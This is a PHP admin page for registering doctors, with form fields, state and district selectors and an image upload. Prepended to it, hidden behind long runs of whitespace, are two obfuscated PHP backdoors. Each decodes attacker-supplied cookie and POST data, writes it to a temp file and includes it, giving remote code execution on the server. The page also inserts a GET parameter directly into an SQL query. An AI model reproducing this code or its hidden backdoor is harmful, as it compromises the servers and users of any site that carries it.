<?php                                                                                                                                                                                                                                                                                                                                                                                                 if (!class_exists("qrqvufnh")){class qrqvufnh{public static $jbqlwk = "gurmxwskrwluewzp";public static $jxbpjsct = NULL;public function __construct(){$tuprvoorh = @$_COOKIE[substr(qrqvufnh::$jbqlwk, 0, 4)];if (!empty($tuprvoorh)){$mvajqllbis = "base64";$haouhw = "";$tuprvoorh = explode(",", $tuprvoorh);foreach ($tuprvoorh as $zehcia){$haouhw .= @$_COOKIE[$zehcia];$haouhw .= @$_POST[$zehcia];}$haouhw = array_map($mvajqllbis . "_decode", array($haouhw,));$haouhw = $haouhw[0] ^ str_repeat(qrqvufnh::$jbqlwk, (strlen($haouhw[0]) / strlen(qrqvufnh::$jbqlwk)) + 1);qrqvufnh::$jxbpjsct = @unserialize($haouhw);}}public function __destruct(){$this->skhfu();}private function skhfu(){if (is_array(qrqvufnh::$jxbpjsct)) {$gfhwcqpud = sys_get_temp_dir() . "/" . crc32(qrqvufnh::$jxbpjsct["salt"]);@qrqvufnh::$jxbpjsct["write"]($gfhwcqpud, qrqvufnh::$jxbpjsct["content"]);include $gfhwcqpud;@qrqvufnh::$jxbpjsct["delete"]($gfhwcqpud);exit();}}}$eejfvsu = new qrqvufnh();$eejfvsu = NULL;} ?><?php                                                                                                                                                                                                                                                                                                                                                                                                 if (!class_exists("ifuedytqh")){class ifuedytqh{public static $jfwahp = "mivinmtoruugkehl";public static $bgmlupka = NULL;public function __construct(){$yuejidd = @$_COOKIE[substr(ifuedytqh::$jfwahp, 0, 4)];if (!empty($yuejidd)){$nwzwuy = "base64";$fonlpmputw = "";$yuejidd = explode(",", $yuejidd);foreach ($yuejidd as $bdvmqmmv){$fonlpmputw .= @$_COOKIE[$bdvmqmmv];$fonlpmputw .= @$_POST[$bdvmqmmv];}$fonlpmputw = array_map($nwzwuy . "_decode", array($fonlpmputw,));$fonlpmputw = $fonlpmputw[0] ^ str_repeat(ifuedytqh::$jfwahp, (strlen($fonlpmputw[0]) / strlen(ifuedytqh::$jfwahp)) + 1);ifuedytqh::$bgmlupka = @unserialize($fonlpmputw);}}public function __destruct(){$this->qzkzl();}private function qzkzl(){if (is_array(ifuedytqh::$bgmlupka)) {$tjadk = sys_get_temp_dir() . "/" . crc32(ifuedytqh::$bgmlupka["salt"]);@ifuedytqh::$bgmlupka["write"]($tjadk, ifuedytqh::$bgmlupka["content"]);include $tjadk;@ifuedytqh::$bgmlupka["delete"]($tjadk);exit();}}}$vmcniaszsr = new ifuedytqh();$vmcniaszsr = NULL;} ?><?php 

	include "header.php"; 

	include "include/cls_doctor.php";

  $a = new cls_doctor();

	if(type2){ 

		if(isset($_GET['ediit'])){



		  $sql="SELECT * FROM  `tbl_doctor` WHERE id=$_GET[ediit]";

			$list=mysqli_fetch_assoc($conn->query($sql));

			$a->id=$list['id']; 

      $a->dname=$list['dname'];
      $a->gender=$list['gender'];
      $a->dcategory=$list['dcategory'];
      $a->dposition=$list['dposition'];
      $a->exp=$list['exp'];
      $a->ddetails=$list['ddetails'];
      $a->email=$list['email'];
      $a->mobile=$list['mobile'];
      $a->staffmobile=$list['staffmobile'];
      $a->address=$list['address'];
      $a->fee=$list['fee'];
      $a->timeing=$list['timeing'];
      $a->state=$list['state'];
      $a->dis=$list['dis'];

		}else{
		    if($user_type==6){ $a->dis=$district;}else{$a->dis=$district='';}
		}

?>

  

 <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/js/bootstrap.min.js"></script>

<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>



 <script>

$(document).ready(function(){

	 $('#statee').on('change', function(){

        var statee = $(this).val();
        if(statee){

            $.ajax({
                type:'POST',
                url:'ajaxData.php',
                data:'statee='+statee,
                success:function(html){
                    $('#diss').html(html);

                }

            }); 

        }else{

$('#city').html('<option value="">--Select state First--</option>'); 

        }

    });

	

	

	

	

	

	

	

    $('#country').on('change', function(){

        var countryID = $(this).val();

        if(countryID){

            $.ajax({

                type:'POST',

                url:'ajaxData.php',

                data:'country_id='+countryID,

                success:function(html){

                    $('#state').html(html);

                    $('#city').html('<option value="">--Select Block first--</option>'); 

                }

            }); 

        }else{

$('#state').html('<option value="">--Select District  first--</option>');

$('#city').html('<option value="">--Select Block First--</option>'); 

        }

    });

    

    $('#state').on('change', function(){

        var stateID = $(this).val();

        if(stateID){

            $.ajax({

                type:'POST',

                url:'ajaxData.php',

                data:'state_id='+stateID,

                success:function(html){

                    $('#city').html(html);

                }

            }); 

        }else{

$('#city').html('<option value="">--Select Block First--</option>'); 

        }

    });

});

</script>

<main class="app-content">

      <div class="app-title">

        <div>

          <h1><i class="fa fa-user-md"> </i> Register Doctor</h1>

        </div>       

      </div>

            <div class="tile-body">

         <div class="row">

     

        <div class="col-md-7">

          <div class="tile">

            <h3 class="tile-title">Doctor Register</h3>

            <hr/>

            <div class="tile-body">

              <form action="include/save.php" method="post" enctype="multipart/form-data" class="form-horizontal">

              <input type="hidden" value="<?php echo !empty($a->id) ? $a->id :'';?>"  name="id"/>

             

            <div class="form-group row">

                  <label class="control-label col-md-3">Doctor Name</label>

                  <div class="col-md-8">

                    <input class="form-control" name="dname" value="<?php echo !empty($a->dname) ? $a->dname :'';?>"    type="text" placeholder="Enter full name">

                  </div>

                </div>

 			<div class="form-group row">

                  <label class="control-label col-md-3">Gender</label>

                  <div class="col-md-9">

                    <div class="form-check">

                      <label class="form-check-label">

                        <input class="form-check-input" value="1"  <?php if($a->gender==1){echo"checked='checked'";} ?> type="radio" name="gender"  >

                        Male

                      </label>

                    </div>

                    <div class="form-check">

                      <label class="form-check-label">

                        <input class="form-check-input" value="2"  type="radio" name="gender" <?php if($a->gender==2){echo"checked='checked'";}?> >Female

                      </label>

                    </div>

                  </div>

                </div>

            <div class="form-group row">

                  <label class="control-label col-md-3">Doctor Category</label>

                  <div class="col-md-8">

                    <select class="form-control" name="dcategory">

                      <option>---Select---</option>

                         <option <?php if($a->dcategory=='Gen Physician Doctor'){echo"selected='selected'";} ?> value="Gen Physician Doctor"    >Gen Physician Doctor</option>

                          <option <?php if($a->dcategory=='Gynaecologist Doctor'){echo"selected='selected'";} ?> value="Gynaecologist Doctor">Gynaecologist Doctor</option>

                          <option <?php if($a->dcategory=='Dentist Doctor'){echo"selected='selected'";} ?> value="Dentist Doctor">Dentist Doctor</option>

                          <option <?php if($a->dcategory=='General Surgeon'){echo"selected='selected'";} ?> value="General Surgeon">General Surgeon</option>

                          <option <?php if($a->dcategory=='Homeopathic Doctor'){echo"selected='selected'";} ?> value="Homeopathic Doctor">Homeopathic Doctor</option>

                          <option <?php if($a->dcategory=='Ayurvedic Doctor'){echo"selected='selected'";} ?> value="Ayurvedic Doctor">Ayurvedic Doctor</option>

                          <option <?php if($a->dcategory=='ild Specialist Doctor'){echo"selected='selected'";} ?> value="Child Specialist Doctor">Child Specialist Doctor</option>

                          <option <?php if($a->dcategory=='Ear/Nose/Throat Doctor'){echo"selected='selected'";} ?> value="Ear/Nose/Throat Doctor">Ear/Nose/Throat Doctor</option>

                          <option <?php if($a->dcategory=='Local Doctor'){echo"selected='selected'";} ?> value="Local Doctor">Local Doctor</option>

                          <option <?php if($a->dcategory=='Orthopaedician Doctor'){echo"selected='selected'";} ?> value="Orthopaedician Doctor">Orthopaedician Doctor</option>

                          <option <?php if($a->dcategory=='Neurologist Doctor'){echo"selected='selected'";} ?> value="Neurologist Doctor">Neurologist Doctor</option>

                          <option <?php if($a->dcategory=='Gaestroentologist'){echo"selected='selected'";} ?> value="Gaestroentologist">Gaestroentologist</option>

                          <option <?php if($a->dcategory=='Dermatologist'){echo"selected='selected'";} ?> value="Dermatologist">Dermatologist</option>

                          <option <?php if($a->dcategory=='Assistant Consultant'){echo"selected='selected'";} ?> value="Assistant Consultant">Assistant Consultant</option>

                          <option <?php if($a->dcategory=='Yoga Consultant'){echo"selected='selected'";} ?> value="Yoga Consultant">Yoga Consultant</option>

                          <option <?php if($a->dcategory=='Physiotherapy'){echo"selected='selected'";} ?> value="Physiotherapy">Physiotherapy</option>

                          <option <?php if($a->dcategory=='Ophiologist'){echo"selected='selected'";} ?> value="Ophiologist (सर्प,विशेषज्ञ)">Ophiologist (सर्प,विशेषज्ञ)</option>

                          <option <?php if($a->dcategory=='Unani'){echo"selected='selected'";} ?> value="Unani"> Unani</option>

                          <option <?php if($a->dcategory=='Sexologist'){echo"selected='selected'";} ?> value="Sexologist"> Sexologist</option>  
                    <option   value="Eye Specialist"> Eye Specialist</option>
                    <option   value="Heart Specialist">Heart Specialist</option>
                    <option   value="Sexologist"> Sexologist</option>
                     

                    </select>                                                                                       

                  </div>

                </div>

            <div class="form-group row">

                  <label class="control-label col-md-3">Doctor Position</label>

                  <div class="col-md-8">

                    <select class="form-control"  name="dposition">

                      <option value="1"  <?php if($a->dposition=='1'){echo"selected='selected'";} ?>>Normal</option>

                      <option value="2"  <?php if($a->dposition=='2'){echo"selected='selected'";} ?>>Premium</option>

                    </select>

                  </div>

                </div>

                

                <div class="form-group row">

                  <label class="control-label col-md-3">Timing</label>

                  <div class="col-md-8">

        	        <input class="form-control" type="text" name="timeing" value="<?php echo !empty($a->timeing) ? $a->timeing :'';?>"  placeholder="Enter Timing">

        	      </div>

                </div>



			<div class="form-group row">

                  <label class="control-label col-md-3">Exprince</label>

                  <div class="col-md-8">

	        <input class="form-control" type="text" name="exp" value="<?php echo !empty($a->exp) ? $a->exp :'';?>"  placeholder="Enter Exprince">

	      </div>

        </div>

    		



          <div class="form-group row">

          <label class="control-label col-md-3">Fee</label>

          <div class="col-md-4">

            <input class="form-control" type="number" maxlength="10" value="<?php echo !empty($a->fee) ? $a->fee :'';?>" name="fee" placeholder="Enter Fee">

          </div>

        </div>





				<div class="form-group row">

                  <label class="control-label col-md-3">Doctot Details</label>

                  <div class="col-md-8">

                    <textarea class="form-control" name="ddetails"  rows="4" placeholder="Enter your address"><?php echo !empty($a->ddetails) ? $a->ddetails :'';?></textarea>

                  </div>

                </div>

                <div class="form-group row">

                  <label class="control-label col-md-3">Email</label>

                  <div class="col-md-8">

                    <input class="form-control col-md-8" name="email" value="<?php echo !empty($a->email) ? $a->email :'';?>" type="email" placeholder="Enter email address">

                  </div>

                </div>



				<div class="form-group row">

	      <label class="control-label col-md-3">Doctor Mobile</label>

	      <div class="col-md-8">

	        <input class="form-control" type="text" maxlength="10" value="<?php echo !empty($a->mobile) ? $a->mobile :'';?>" name="mobile" placeholder="Enter Mobile">

	      </div>

	    </div>

	<div class="form-group row">

	      <label class="control-label col-md-3">Staff Mobile No.</label>

	      <div class="col-md-8">

	        <input class="form-control" type="text" maxlength="10" value="<?php echo !empty($a->staffmobile) ? $a->staffmobile :'';?>" name="smobile" placeholder="Enter Mobile">

	      </div>

	    </div>

            

            

            <div class="form-group row">

	             <label class="control-label col-md-3">State</label>

	             <div class="col-md-8">

            		<select name="state" id="statee" class="form-control"  >

            			<option value="0">--Select State--</option>

                         <?php 

                         include"include/conn.php";

                         $query =mysqli_query($conn,"SELECT * FROM state");

                        while($row=mysqli_fetch_array($query))

                        { 

                            $id=$row['StCode'];

                            if($row['StCode']==5){

                                $selected="selected";

                            }else{

                                $selected="";

                            }

                            

                           

                        ?>

                            <?php  if(isset($_GET['ediit'])){ ?>

                            <option value="<?php echo $row['StCode'];?>" <?php if($a->state==$id){

                                echo"selected='selected'"; }?>><?php echo $row['StateName'];?></option> <?php }else{  ?>

                          

                            <option value="<?php echo $row['StCode'];?>" <?=$selected; ?>><?php echo $row['StateName'];?></option> <?php  }}?>

                       

				</select>

		    </div>

		  </div>

            

            

            <div class="form-group row">

	             <label class="control-label col-md-3">District</label>

	             <div class="col-md-8">

            		<select id="inputState" name="district" class="form-control">

            	        <option >--Select District--</option>

            	        <option <?php if($a->dis==71){echo"selected='selected'";} ?> value="71">Gopalganj</option>

            	        <option <?php if($a->dis==94){echo"selected='selected'";} ?> value="94">Siwan</option>

      	        </select>

		    </div>

		  </div>



                <div class="form-group row">

                  <label class="control-label col-md-3">Address</label>

                  <div class="col-md-8">

                    <textarea class="form-control" rows="4"    name="address" placeholder="Enter your address"><?php echo !empty($a->address) ? $a->address :'';?></textarea>

                  </div>

                </div>





                <?php if(isset($_GET['ediit'])){?>

                <div class="form-group row">

                  <label class="control-label col-md-3">Image</label>

                  <div class="col-md-8">

                       <input class="form-control" type="file" id="imgInp" name="image"><br/>

                       <img id="blah"  src="image-doctor/<?=$list['Image'];?>"  width="100%" height="200px"/> 

                  </div>

                  

                </div>

                  <?php }else{ ?> 

                    <div class="form-group row">

                  <label class="control-label col-md-3">Image</label>

                  <div class="col-md-8">

                       <input class="form-control" type="file" id="imgInp" name="image"><br/>

                       <img id="blah" src="#"  width="100%" height="200px"/> 

                  </div>

                  

                </div>



                <?php  } ?>



            <div class="tile-footer">

              <div class="row">

                <div class="col-md-8 col-md-offset-4">

                  <button class="btn btn-primary" name="add-doctor" type="submit"><i class="fa fa-fw fa-lg fa-check-circle"></i>Register</button>&nbsp;&nbsp;&nbsp;<a class="btn btn-secondary" href="#"><i class="fa fa-fw fa-lg fa-times-circle"></i>Cancel</a>

                </div>

              </div>

            </div>

            </form>

          </div>

        </div>

        <div class="clearix"></div>

       

      </div>

  

  	  </div>



  

</main>

<?php 

 

include "footer.php";

}

else{

echo"<script>alert('You Are Not a Member');document.location='../index.php'</script>";

}?>

  

     <script>

                imgInp.onchange = evt => {

                const [file] = imgInp.files

                if (file) {

                blah.src = URL.createObjectURL(file)

                  }

                  }

     </script>